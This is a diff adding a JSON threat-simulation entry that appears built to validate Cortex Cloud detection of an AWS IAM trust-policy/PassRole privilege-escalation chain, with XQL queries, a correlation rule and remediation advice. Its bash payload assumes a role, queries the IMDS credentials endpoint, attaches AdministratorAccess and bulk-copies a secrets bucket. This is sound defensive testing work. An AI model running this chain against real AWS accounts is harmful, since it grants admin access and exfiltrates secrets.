@@ -1,0 +1,426 @@
+{
+  "id": "TTP-2026-0121",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-07-24T02:49:27+00:00",
+    "updated_at": "2026-07-24T02:49:27+00:00",
+    "authors": [
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "plane-cspm",
+      "vector-iam-misconfiguration",
+      "iam-trust-policy",
+      "passrole-abuse",
+      "privilege-escalation",
+      "imds-credential-theft",
+      "posture-to-impact",
+      "industry-all",
+      "severity-high",
+      "cspm",
+      "aws"
+    ],
+    "source_refs": [
+      "SRC-UNIT42",
+      "SRC-MITRE-ATTACK",
+      "SRC-PANW-TECHDOCS"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "cloud",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": true,
+      "platforms": [
+        "aws"
+      ],
+      "estimated_runtime_seconds": 1800,
+      "cleanup_required": true,
+      "safety_class": "safe-by-design"
+    }
+  },
+  "identity": {
+    "name": "IAM Trust-Policy / PassRole Posture Finding Correlated to Runtime AssumeRole + IMDS Privilege-Escalation Chain — Cortex Cloud CSPM",
+    "summary": "A CSPM finding on an IAM role — wildcard trust principal or unrestricted iam:PassRole — is fused with the CloudTrail runtime chain on that role ARN: AssumeRole -> IMDS credential retrieval -> AttachRolePolicy(AdministratorAccess) -> KMS Decrypt + bulk S3 GetObject. One correlation names the misconfig, who exploited it, when it became privileged, and what it reached.",
+    "description": "A point-in-time CSPM finding tells you an IAM role is misconfigured; it does not tell you that the same role was assumed, escalated to AdministratorAccess, and used to read a bucket of secrets an hour later. Unit 42's analysis of IAM roles compromised through vulnerable workloads (283,751 files across 145,623 GitHub repositories surfaced 32,987 AWS account IDs and 68,361 role names) shows the whole failure mode is customer IAM misconfiguration — overly permissive trust policies and unrestricted iam:PassRole — turned into org-wide access, not any AWS platform vulnerability. This scenario exercises Cortex Cloud CSPM's posture-to-impact correlation rather than a flat scan. Signal A is the posture finding: a disposable lab IAM role (tagged CortexSimIAMExposure) whose learned-compliant baseline is violated — either a trust policy with an anonymous principal (\"Principal\": { \"AWS\": \"*\" }, assumable without credentials) or a permissions policy granting iam:PassRole with Resource:* and no role-name or service restriction. Signal B is the runtime privilege-escalation chain on that exact role ARN, captured in cloud_audit_logs and endpoint telemetry: an anonymous or unusual cross-account AssumeRole, an IMDS credential retrieval from the compromised workload (http://169.254.169.254/latest/meta-data/iam/security-credentials/, the T1552.005 anchor), then the iam:PassRole abuse attaching AdministratorAccess to a compute role (AttachRolePolicy / PutRolePolicy / CreateRole, the TA0004 Privilege-Escalation core — T1548.005 Temporary Elevated Cloud Access + T1098.003 Additional Cloud Roles). Signal C is the impact under the newly-privileged assumed-role session: KMS Decrypt to unwrap encrypted credential files and bulk S3 GetObject of certificate keys and deployment scripts (T1580 Cloud Infrastructure Discovery + T1530 Data from Cloud Storage). Detection is Analytics/XQL/Correlation, not behavioral-ML: posture is configuration state, so the queries assert the role was exposed, that it was assumed anonymously/cross-account, that IMDS credentials were pulled, that AdministratorAccess was attached, and that KMS+S3 impact followed under the assumed-role identity. Correlation CR-CSPM-0005 fuses Signal A + Signal B + Signal C on the role ARN, principal, and time window into a single 'IAM-exposure exploited to org-wide access' incident — proving the exact moment the misconfiguration became impact, who did it, and what they reached. This is the differentiator over a checkbox IAM scanner: not just 'this role is over-permissive' but 'this over-permissive role was exploited end to end, here is the chain.'",
+    "severity": "high",
+    "confidence": "high"
+  },
+  "threat_context": {
+    "actors": [
+      {
+        "name": "Unattributed intruders abusing IAM misconfigurations in compromised workloads (Unit 42 IAM-roles research)"
+      }
+    ],
+    "campaigns": [
+      "IAM trust-policy and PassRole abuse turning misconfigured cloud roles into org-wide access"
+    ],
+    "malware_families": [],
+    "industries_targeted": [
+      "all"
+    ],
+    "first_observed": "2023-01-01"
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1548",
+        "subtechnique_id": "T1548.005",
+        "name": "Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access",
+        "tactic_ids": [
+          "TA0004"
+        ],
+        "tactic_names": [
+          "Privilege Escalation"
+        ]
+      },
+      {
+        "technique_id": "T1098",
+        "subtechnique_id": "T1098.003",
+        "name": "Account Manipulation: Additional Cloud Roles",
+        "tactic_ids": [
+          "TA0004"
+        ],
+        "tactic_names": [
+          "Privilege Escalation"
+        ]
+      },
+      {
+        "technique_id": "T1078",
+        "subtechnique_id": "T1078.004",
+        "name": "Valid Accounts: Cloud Accounts",
+        "tactic_ids": [
+          "TA0004"
+        ],
+        "tactic_names": [
+          "Privilege Escalation"
+        ]
+      },
+      {
+        "technique_id": "T1552",
+        "subtechnique_id": "T1552.005",
+        "name": "Unsecured Credentials: Cloud Instance Metadata API",
+        "tactic_ids": [
+          "TA0006"
+        ],
+        "tactic_names": [
+          "Credential Access"
+        ]
+      },
+      {
+        "technique_id": "T1580",
+        "name": "Cloud Infrastructure Discovery",
+        "tactic_ids": [
+          "TA0007"
+        ],
+        "tactic_names": [
+          "Discovery"
+        ]
+      },
+      {
+        "technique_id": "T1530",
+        "name": "Data from Cloud Storage",
+        "tactic_ids": [
+          "TA0009"
+        ],
+        "tactic_names": [
+          "Collection"
+        ]
+      }
+    ],
+    "kill_chain_phase": "exploitation",
+    "data_sources": [
+      "Cloud Service: Cloud Service Modification",
+      "Cloud Storage: Cloud Storage Access",
+      "User Account: User Account Authentication",
+      "Instance: Instance Metadata"
+    ]
+  },
+  "execution": {
+    "target_platform": "aws",
+    "execution_framework": "custom-cortex",
+    "framework_reference_id": "SIM-CSPM-003 — IAM trust-policy/PassRole posture finding correlated to the runtime AssumeRole + IMDS privilege-escalation chain",
+    "privilege_required": "cloud-iam-user",
+    "prerequisites": [
+      {
+        "description": "Cortex Cloud CSPM enabled and connected (read-only) to the target AWS account with IAM posture and CloudTrail (cloud_audit_logs) ingestion on.",
+        "check_command": "aws sts get-caller-identity --profile cortexsim-lab"
+      },
+      {
+        "description": "A disposable lab IAM role (tagged CortexSimIAMExposure) exists with a deliberately exposed trust policy (anonymous principal) or an unrestricted iam:PassRole permission, plus a disposable KMS-encrypted secrets bucket for the impact stage.",
+        "check_command": "aws iam get-role --role-name CortexSimExposedRole --profile cortexsim-lab"
+      },
+      {
+        "description": "CloudTrail S3 DATA events are enabled on the disposable secrets bucket via an advanced event selector (eventCategory=Data, AWS::S3::Object read scope + AWS::S3::Bucket) so GetObject/ListObjects/ListBucket land in cloud_audit_logs. S3 object/bucket reads are CloudTrail data events and are OFF by default; KMS Decrypt is a management event and needs no selector. Without this selector XQL #5 (impact_events >= 5) and XQL #6 (chain_stages >= 3) collapse to just the Decrypt verb and return zero rows. The cspm Terraform module provisions this selector on the CortexSim secrets bucket.",
+        "check_command": "aws cloudtrail get-event-selectors --trail-name cortexsim-cspm-trail --profile cortexsim-lab --query 'AdvancedEventSelectors[?contains(to_string(FieldSelectors), `AWS::S3::Object`)]'"
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# Posture-to-impact IAM chain (authorized, reversible) against a disposable\n# lab role. Every mutation (AttachRolePolicy) is undone by cleanup; reads\n# (AssumeRole, IMDS, KMS Decrypt, S3 GetObject) are non-destructive.\nset -euo pipefail\nROLE=\"${EXPOSED_ROLE:-CortexSimExposedRole}\"\nPROFILE=\"${AWS_PROFILE:-cortexsim-lab}\"\nBUCKET=\"${SECRETS_BUCKET:-cortexsim-iam-secrets}\"\n# (B) runtime: assume the exposed role and CAPTURE the session credentials so every\n# escalation/impact call below is attributed to assumed-role/CortexSimExposedRole/cortexsim-exposure\n# in CloudTrail (not the base lab profile) — keeping the executing identity in sync with XQL #5/#6.\nCREDS=$(aws sts assume-role --role-arn \"arn:aws:iam::${TARGET_ACCOUNT:-000000000000}:role/${ROLE}\" --role-session-name cortexsim-exposure --profile \"${PROFILE}\" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text 2>/dev/null || true)\nif [ -n \"${CREDS}\" ]; then\n  export AWS_ACCESS_KEY_ID=$(echo \"${CREDS}\" | awk '{print $1}')\n  export AWS_SECRET_ACCESS_KEY=$(echo \"${CREDS}\" | awk '{print $2}')\n  export AWS_SESSION_TOKEN=$(echo \"${CREDS}\" | awk '{print $3}')\nfi\n# IMDS credential retrieval from the compromised workload (T1552.005 anchor)\ncurl -s --max-time 5 \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" -o /dev/null 2>/dev/null || true\n# (B) privilege escalation: attach AdministratorAccess UNDER the assumed-role session (reversible, no --profile)\naws iam attach-role-policy --role-name \"${ROLE}\" --policy-arn \"arn:aws:iam::aws:policy/AdministratorAccess\" 2>/dev/null || true\n# (C) impact: bulk S3 GetObject (CloudTrail data events) + KMS Decrypt (management event) under the assumed-role session (no --profile)\naws s3 ls \"s3://${BUCKET}/\" 2>/dev/null | head -20 || true\naws s3 cp \"s3://${BUCKET}/\" /tmp/cortexsim_iam_loot/ --recursive 2>/dev/null || true\necho '[CortexSim] SIM-CSPM-003 posture-to-impact chain exercised under assumed-role/CortexSimExposedRole (reversible).'",
+      "input_variables": [
+        {
+          "name": "EXPOSED_ROLE",
+          "type": "string",
+          "default": "CortexSimExposedRole",
+          "description": "Disposable lab IAM role with a wildcard trust principal or unrestricted iam:PassRole."
+        },
+        {
+          "name": "SECRETS_BUCKET",
+          "type": "string",
+          "default": "cortexsim-iam-secrets",
+          "description": "Disposable KMS-encrypted bucket the newly-privileged session reads for the impact stage."
+        },
+        {
+          "name": "AWS_PROFILE",
+          "type": "string",
+          "default": "cortexsim-lab",
+          "description": "Named AWS CLI profile scoped to the disposable IAM-exposure lab resources."
+        }
+      ],
+      "timeout_seconds": 1800
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "cloud-api-call",
+        "description": "Anonymous or cross-account AssumeRole against the exposed role ARN captured in cloud_audit_logs.",
+        "expected_value": "event_name = \"AssumeRole\" and resource_arn contains \"CortexSimExposedRole\""
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "IMDS credential retrieval from the compromised workload — a request to the instance metadata service for role security-credentials.",
+        "expected_value": "action_remote_ip = \"169.254.169.254\" and action_process_command_line contains \"security-credentials\""
+      },
+      {
+        "artifact_type": "cloud-api-call",
+        "description": "iam:PassRole abuse attaching AdministratorAccess to a compute role, and the KMS Decrypt + bulk S3 GetObject impact under the assumed-role session.",
+        "expected_value": "event_name in (AttachRolePolicy, Decrypt, GetObject) and user_identity_arn contains \"assumed-role/CortexSimExposedRole\""
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "aws iam detach-role-policy --role-name \"${EXPOSED_ROLE:-CortexSimExposedRole}\" --policy-arn \"arn:aws:iam::aws:policy/AdministratorAccess\" --profile \"${AWS_PROFILE:-cortexsim-lab}\" 2>/dev/null || true; rm -rf /tmp/cortexsim_iam_loot; echo '[CortexSim] SIM-CSPM-003 cleanup complete — AdministratorAccess detached, loot removed, exposed-role baseline restored.'"
+    }
+  },
+  "detections": {
+    "iocs": [],
+    "biocs": [],
+    "abiocs": [],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "CSPM-003 Wildcard-Trust or Unrestricted PassRole IAM Posture Finding",
+        "query": "dataset = cortex_cloud_posture\n| filter _time > to_timestamp(current_time() - 3600)\n| filter cloud_provider = \"AWS\" and resource_type = \"aws_iam_role\"\n| filter tags contains \"CortexSimIAMExposure\"\n| filter compliance_state = \"violation\" and finding_class in (\"iam-role-wildcard-trust-principal\", \"iam-passrole-unrestricted-resource\")\n| comp count_distinct(resource_id) as exposed_roles by finding_class\n| filter exposed_roles >= 1\n| fields finding_class, exposed_roles",
+        "expected_rows_min": 1,
+        "dataset": "cortex_cloud_posture"
+      },
+      {
+        "purpose": "validation",
+        "name": "CSPM-003 Anonymous or Cross-Account AssumeRole on Exposed Role",
+        "query": "dataset = cloud_audit_logs\n| filter _time > to_timestamp(current_time() - 3600)\n| filter cloud_provider = \"AWS\" and event_source = \"sts.amazonaws.com\" and event_name = \"AssumeRole\"\n| filter resource_arn contains \"CortexSimExposedRole\"\n| comp count() as assume_events by resource_arn, source_ip, user_identity_arn\n| filter assume_events >= 1\n| sort desc assume_events\n| fields resource_arn, source_ip, user_identity_arn, assume_events",
+        "expected_rows_min": 1,
+        "dataset": "cloud_audit_logs"
+      },
+      {
+        "purpose": "validation",
+        "name": "CSPM-003 IMDS Role-Credential Retrieval from Compromised Workload",
+        "query": "dataset = xdr_data\n| filter _time > to_timestamp(current_time() - 3600)\n| filter event_type = ENUM.NETWORK or event_type = ENUM.PROCESS\n| filter action_remote_ip = \"169.254.169.254\" or action_process_command_line contains \"169.254.169.254/latest/meta-data/iam/security-credentials\"\n| comp count() as imds_cred_reads by agent_hostname, actor_effective_username\n| filter imds_cred_reads >= 1\n| fields agent_hostname, actor_effective_username, imds_cred_reads",
+        "expected_rows_min": 0,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "CSPM-003 PassRole and AttachRolePolicy Granting AdministratorAccess",
+        "query": "dataset = cloud_audit_logs\n| filter _time > to_timestamp(current_time() - 3600)\n| filter cloud_provider = \"AWS\" and event_source = \"iam.amazonaws.com\"\n| filter event_name in (\"AttachRolePolicy\", \"PutRolePolicy\", \"CreateRole\", \"AttachUserPolicy\")\n| filter request_parameters contains \"AdministratorAccess\" or request_parameters contains \"arn:aws:iam::aws:policy/AdministratorAccess\"\n| comp count() as privesc_writes by event_name, user_identity_arn, resource_arn\n| filter privesc_writes >= 1\n| sort desc privesc_writes\n| fields event_name, user_identity_arn, resource_arn, privesc_writes",
+        "expected_rows_min": 1,
+        "dataset": "cloud_audit_logs"
+      },
+      {
+        "purpose": "validation",
+        "name": "CSPM-003 KMS Decrypt and Bulk S3 GetObject from Newly-Privileged Session",
+        "query": "dataset = cloud_audit_logs\n| filter _time > to_timestamp(current_time() - 3600)\n| filter cloud_provider = \"AWS\" and event_source in (\"s3.amazonaws.com\", \"kms.amazonaws.com\")\n| filter event_name in (\"GetObject\", \"ListObjects\", \"ListBucket\", \"Decrypt\")\n| filter user_identity_arn contains \"assumed-role/CortexSimExposedRole\"\n| comp count() as impact_events, count_distinct(event_name) as impact_verbs by user_identity_arn\n| filter impact_events >= 5 and impact_verbs >= 2\n| sort desc impact_events\n| fields user_identity_arn, impact_events, impact_verbs",
+        "expected_rows_min": 1,
+        "dataset": "cloud_audit_logs"
+      },
+      {
+        "purpose": "validation",
+        "name": "CSPM-003 Posture-to-Impact Chain Completeness on the Exposed Role",
+        "query": "dataset = cloud_audit_logs\n| filter _time > to_timestamp(current_time() - 3600)\n| filter cloud_provider = \"AWS\"\n| filter user_identity_arn contains \"assumed-role/CortexSimExposedRole\"\n| filter event_name in (\"AttachRolePolicy\", \"PutRolePolicy\", \"CreateRole\", \"Decrypt\", \"GetObject\", \"ListBucket\")\n| comp count_distinct(event_name) as chain_stages, count() as chain_events by user_identity_arn\n| filter chain_stages >= 3\n| sort desc chain_events\n| fields user_identity_arn, chain_stages, chain_events",
+        "expected_rows_min": 1,
+        "dataset": "cloud_audit_logs"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "name": "IAM Exposure Exploited to Org-Wide Access — Posture-to-Impact Stitch",
+        "rule_id": "CR-CSPM-0005",
+        "logic": "XQL(CSPM-003 Wildcard-Trust or Unrestricted PassRole IAM Posture Finding) AND ( XQL(CSPM-003 Anonymous or Cross-Account AssumeRole on Exposed Role) OR XQL(CSPM-003 IMDS Role-Credential Retrieval from Compromised Workload) ) AND XQL(CSPM-003 PassRole and AttachRolePolicy Granting AdministratorAccess) AND XQL(CSPM-003 KMS Decrypt and Bulk S3 GetObject from Newly-Privileged Session) — fuses the CSPM wildcard-trust/unrestricted-PassRole posture finding (Signal A) with the runtime AssumeRole plus IMDS credential retrieval plus AttachRolePolicy AdministratorAccess privilege-escalation chain (Signal B) and the KMS-Decrypt plus bulk S3 GetObject impact (Signal C) on the same exposed role ARN, principal, and time window into a single 'IAM-exposure exploited to org-wide access' incident that names the misconfigured role, who assumed it, the moment it became privileged, and what data it reached."
+      }
+    ],
+    "analytics_modules": [
+      "Cortex Cloud CSPM — IAM trust-policy and PassRole posture evaluation against a compliant baseline",
+      "Cortex Cloud Posture — posture-to-runtime correlation (IAM posture inventory joined to cloud_audit_logs)",
+      "Cortex XSIAM Analytics — attribution of the AssumeRole/PassRole/AttachRolePolicy chain to a principal and assumed-role session"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-cloud",
+        "submodule": "cloud-posture",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-CORTEX-CLOUD-001",
+          "TBD-CORTEX-CLOUD-002"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = cortex_cloud_posture | filter tags contains \"CortexSimIAMExposure\" and compliance_state = \"violation\" | comp count_distinct(resource_id) by finding_class | fields finding_class, resource_id"
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "analytics",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-CORTEX-XSIAM-001"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "Correlation CR-CSPM-0005 stitches the IAM posture finding to its runtime AssumeRole/PassRole/IMDS escalation and the KMS+S3 impact into one posture-to-impact incident."
+      },
+      {
+        "module": "prisma-cloud",
+        "submodule": "cloud-posture",
+        "coverage_tier": "exposure-mgmt",
+        "rule_ids": [
+          "TBD-PRISMA-CLOUD-001",
+          "TBD-PRISMA-CLOUD-002"
+        ],
+        "license_required": "enterprise",
+        "evidence_query": "Prisma Cloud IAM Security — over-permissive role findings (wildcard trust principal, unrestricted iam:PassRole) on CortexSim-tagged roles against the CIS AWS Foundations and AWS IAM best-practice policies."
+      }
+    ],
+    "use_cases": [
+      {
+        "use_case_id": "UC-CSPM-003",
+        "name": "IAM Exposure-to-Impact Correlation — Posture Finding Stitched to the Runtime Privilege-Escalation Chain",
+        "description": "Cortex Cloud CSPM surfaces an over-permissive IAM role (wildcard trust principal or unrestricted iam:PassRole) and correlates that posture finding with the runtime AssumeRole -> IMDS credential retrieval -> AttachRolePolicy(AdministratorAccess) escalation and the KMS+S3 impact that followed, presenting the whole posture-to-impact chain as one incident.",
+        "test_cases": [
+          {
+            "test_case_id": "TC-CSPM-003A",
+            "objective": "Cortex Cloud CSPM flags the exposed IAM role and the runtime chain that exploits it is observable in cloud_audit_logs.",
+            "preconditions": [
+              "Cortex Cloud CSPM connected (read-only) with IAM posture evaluation on.",
+              "Disposable lab role tagged CortexSimIAMExposure exists with a wildcard trust principal or unrestricted iam:PassRole."
+            ],
+            "steps": [
+              "Surface the wildcard-trust / unrestricted-PassRole posture finding.",
+              "Assume the exposed role and retrieve instance-profile credentials via IMDS.",
+              "Attach AdministratorAccess to the role via iam:PassRole abuse."
+            ],
+            "success_criteria": [
+              "XQL `CSPM-003 Wildcard-Trust or Unrestricted PassRole IAM Posture Finding` returns >= 1.",
+              "XQL `CSPM-003 Anonymous or Cross-Account AssumeRole on Exposed Role` returns >= 1.",
+              "XQL `CSPM-003 PassRole and AttachRolePolicy Granting AdministratorAccess` returns >= 1."
+            ],
+            "expected_score_weight": 0.5
+          },
+          {
+            "test_case_id": "TC-CSPM-003B",
+            "objective": "The impact under the newly-privileged assumed-role session is observed and the full chain reconciles.",
+            "preconditions": [
+              "KMS Decrypt and bulk S3 GetObject run under the assumed-role session on the disposable secrets bucket."
+            ],
+            "steps": [
+              "Run KMS Decrypt + bulk S3 GetObject under the assumed-role session.",
+              "Observe the chain-completeness query return chain_stages >= 3."
+            ],
+            "success_criteria": [
+              "XQL `CSPM-003 KMS Decrypt and Bulk S3 GetObject from Newly-Privileged Session` returns >= 1.",
+              "XQL `CSPM-003 Posture-to-Impact Chain Completeness on the Exposed Role` returns chain_stages >= 3."
+            ],
+            "expected_score_weight": 0.3
+          },
+          {
+            "test_case_id": "TC-CSPM-003C",
+            "objective": "Correlation fuses the posture finding, the runtime escalation, and the impact into one posture-to-impact incident.",
+            "preconditions": [
+              "Signals A, B, and C are all observed within the correlation window on the same exposed role ARN."
+            ],
+            "steps": [
+              "Let the correlation engine converge over the run window.",
+              "Observe CR-CSPM-0005 raise one 'IAM-exposure exploited to org-wide access' incident spanning the CSPM posture and cloud-audit runtime planes."
+            ],
+            "success_criteria": [
+              "Correlation CR-CSPM-0005 raises exactly one incident naming the misconfigured role, the principal, and the exploitation window.",
+              "The stitched incident's causality spans >= 2 planes (CSPM posture + cloud-audit runtime)."
+            ],
+            "expected_score_weight": 0.2
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Never grant anonymous role assumption — prohibit trust policies with Principal AWS \"*\" and require a specific principal plus an unguessable sts:ExternalId and an aws:SourceIp condition (Unit 42's primary recommendation).",
+      "Always restrict iam:PassRole to specific role ARNs and services via a Resource and iam:PassedToService condition — never Resource \"*\" — so a compromised role cannot pass an AdministratorAccess role to a compute service.",
+      "Enforce IMDSv2 (hop-limit 1, tokens required) and scope instance-profile permissions to least privilege so a workload compromise cannot mint broadly-privileged credentials.",
+      "Deny AttachRolePolicy/PutRolePolicy of AdministratorAccess (and other broad managed policies) except to a break-glass role via SCP, and automate credential rotation."
+    ],
+    "detection_engineering": [
+      "Track IAM roles whose trust policy or PassRole scope drifts from a compliant baseline (wildcard principal, Resource \"*\") rather than only point-in-time snapshots.",
+      "Join the IAM posture inventory to cloud_audit_logs so every over-permissive-role finding is correlated to any AssumeRole, PassRole, and AttachRolePolicy activity on that exact role ARN.",
+      "Escalate an IAM-exposure finding to an incident when the runtime chain is observed end to end — anonymous/cross-account AssumeRole, IMDS credential retrieval, AdministratorAccess attachment, then KMS Decrypt + bulk S3 GetObject under the assumed-role session.",
+      "Enable CloudTrail S3 data events on the secrets bucket before relying on the impact leg — S3 GetObject/ListObjects/ListBucket are data events (off by default) while KMS Decrypt is a management event; without the data-event selector the S3 verbs never reach cloud_audit_logs and the posture-to-impact differentiator collapses to the lone Decrypt verb."
+    ],
+    "response_playbook": "XSOAR-PB-IAMExposureExploitedTriage-v1"
+  },
+  "references": [
+    {
+      "title": "Unit 42 — Compromised IAM Roles in Vulnerable Cloud Workloads (trust-policy and PassRole abuse)",
+      "url": "https://unit42.paloaltonetworks.com/iam-roles-compromised-workloads/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1548.005 — Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access",
+      "url": "https://attack.mitre.org/techniques/T1548/005/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1552.005 — Unsecured Credentials: Cloud Instance Metadata API",
+      "url": "https://attack.mitre.org/techniques/T1552/005/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1098.003 — Account Manipulation: Additional Cloud Roles",
+      "url": "https://attack.mitre.org/techniques/T1098/003/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "Cortex Cloud — Posture Management and IAM Security",
+      "url": "https://docs-cortex.paloaltonetworks.com/r/Cortex-CLOUD/Cortex-Cloud-Posture-Security",
+      "publisher": "Palo Alto Networks TechDocs",
+      "publisher_id": "SRC-PANW-TECHDOCS"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "1.0.0",
+      "date": "2026-07-24",
+      "author": "Henry Reed",
+      "change": "Replaced the research-intake scaffold with the real IAM trust-policy/PassRole posture-to-impact chain for SIM-CSPM-003 (gap DL-05). Six XQL validations against cortex_cloud_posture / cloud_audit_logs / xdr_data (wildcard-trust or unrestricted-PassRole posture finding, anonymous/cross-account AssumeRole, IMDS credential retrieval, AttachRolePolicy(AdministratorAccess) escalation, KMS Decrypt + bulk S3 GetObject impact, and posture-to-impact chain completeness) plus correlation CR-CSPM-0005 stitching Signal A + B + C into one 'IAM-exposure exploited to org-wide access' incident. Analytics/XQL/Correlation only (posture, not behavioral-ML): no ABIOCs. MITRE depth on TA0004 (T1548.005 / T1098.003 / T1078.004) with T1552.005 / T1580 / T1530. Grounded in Unit 42's compromised-IAM-roles research (no real IOCs published, so none authored). Promoted to active."
+    }
+  ]
+}
